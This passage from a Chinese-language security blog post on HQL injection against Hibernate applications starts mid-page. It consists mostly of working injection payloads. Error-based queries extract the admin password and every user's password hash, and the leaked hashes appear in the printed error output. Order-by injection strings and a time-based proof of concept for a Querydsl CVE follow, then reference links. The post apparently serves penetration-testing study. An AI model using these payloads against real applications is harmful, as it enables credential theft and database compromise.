</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SQL</span><span class="w"> </span><span class="k">statement</span><span class="p">:</span><span class="k">select</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">id</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">id18_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">author</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">author18_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">promotionCode</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">promotio3_18_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">title</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">title18_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">visible</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">visible18_</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">Book</span><span class="w"> </span><span class="n">book0_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%11&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">user1_</span><span class="p">.</span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="n">user1_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">user1_</span><span class="p">.</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">published</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="p">[</span><span class="mi">22018</span><span class="o">-</span><span class="mi">159</span><span class="p">]</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>利用数据库函数</strong></p>
<p>如：若数据库支持<code>group_concat</code>函数：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from Bookwhere title like &#39;%11&#39;    and (select cast(group_concat(password) as string) from User)=1    or &#39;&#39;=&#39;%&#39;    and published = true</span></span></code></pre></td></tr></table>
</div>
</div><p>则异常触发为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">Data</span><span class="w"> </span><span class="k">conversion</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="n">converting</span><span class="s2">&#34;3f3ff0cdbfa0d515f8e3751e4ed98abe,79a41d71c31128ffab81ac8df2069f9c,b7fe6f6a1024db6e56027aeb558f9e68&#34;</span><span class="p">;</span><span class="k">SQL</span><span class="w"> </span><span class="k">statement</span><span class="p">:</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">id</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">id18_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">author</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">author18_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">promotionCodeas</span><span class="w"> </span><span class="n">promotio3_18_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">title</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">title18_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">visible</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">visible18_</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">Book</span><span class="w"> </span><span class="n">book0_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%11&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">cast</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="n">user1_</span><span class="p">.</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="n">user1_</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="n">published</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="p">[</span><span class="mi">22018</span><span class="o">-</span><span class="mi">159</span><span class="p">]</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="案例2-orderby" class="heading-element"><span>案例2-orderby</span>
  <a href="#%e6%a1%88%e4%be%8b2-orderby" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><a href="https://medium.com/@oscuridad1010/orm-hql-injection-e072207e8942"target="_blank" rel="external nofollow noopener noreferrer">ORM HQL Injection</a></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="k">view</span><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="n">createdAt</span><span class="p">,</span><span class="nb">date</span><span class="w">   </span><span class="o">#</span><span class="w"> </span><span class="err">正常</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="k">view</span><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="n">createdAt</span><span class="p">,()</span><span class="w"> 		</span><span class="o">#</span><span class="w"> </span><span class="n">hql</span><span class="w"> </span><span class="err">报错</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Order</span><span class="w"> </span><span class="n">by位置</span><span class="err">，注入点在联合查询的中间，需要平衡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="k">view</span><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="n">createdAt</span><span class="p">,</span><span class="k">FUNCTION</span><span class="p">(</span><span class="n">CURRENT_INSTANT</span><span class="p">)</span><span class="w"> </span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><a href="https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"target="_blank" rel="external nofollow noopener noreferrer">CVE-2024-49203: Querydsl HQL orderby注入</a></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">poc</span><span class="p">:</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">CSIRTTrizna</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2024</span><span class="o">-</span><span class="mi">49203</span><span class="o">/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">orderBy</span><span class="o">=</span><span class="n">name</span><span class="w"> </span><span class="k">INTERSECT</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">Test</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">cast</span><span class="p">(</span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">text</span><span class="p">))</span><span class="o">=</span><span class="s1">&#39;2&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">t</span><span class="p">.</span><span class="n">id</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="参考资料" class="heading-element"><span>参考资料</span>
  <a href="#%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><a href="https://hibernate.org/orm/documentation/6.0/"target="_blank" rel="external nofollow noopener noreferrer">Hibernate官方文档</a></li>
<li><a href="https://docs.jboss.org/hibernate/orm/6.3/querylanguage/html_single/Hibernate_Query_Language.html"target="_blank" rel="external nofollow noopener noreferrer">HQL文档</a></li>
<li><a href="https://www.geeksforgeeks.org/hibernate-query-language/"target="_blank" rel="external nofollow noopener noreferrer">Hibernate – Query Language</a></li>
<li><a href="https://mp.weixin.qq.com/s/b0RDuQSjibAKYl8HhhcBbg"target="_blank" rel="external nofollow noopener noreferrer">HQL注入深入利用</a></li>
<li><a href="https://blog.h3xstream.com/2014/02/hql-for-pentesters.html"target="_blank" rel="external nofollow noopener noreferrer">HQL for pentesters</a></li>
<li><a href="https://ultramangaia.github.io/blog/2017/pwn2win-ctf-2017.html"target="_blank" rel="external nofollow noopener noreferrer">https://ultramangaia.github.io/blog/2017/pwn2win-ctf-2017.html</a></li>
</ul></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2025-03-12 14:46:18">更新于 2025-03-12&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/sqli/" class="post-tag" title="标签 - SQLi">SQLi</a><a href="/tags/java/" class="post-tag" title="标签 - Java">Java</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/002-case_simpleencryptioncase/" class="post-nav-item" rel="prev" title="002-渗透案例：记一次简单前端加密案例"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>002-渗透案例：记一次简单前端加密案例</a><a href="/posts/arl_setup_record/" class="post-nav-item" rel="next" title="ARL灯塔Docker版搭建记录">ARL灯塔Docker版搭建记录<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
</html>
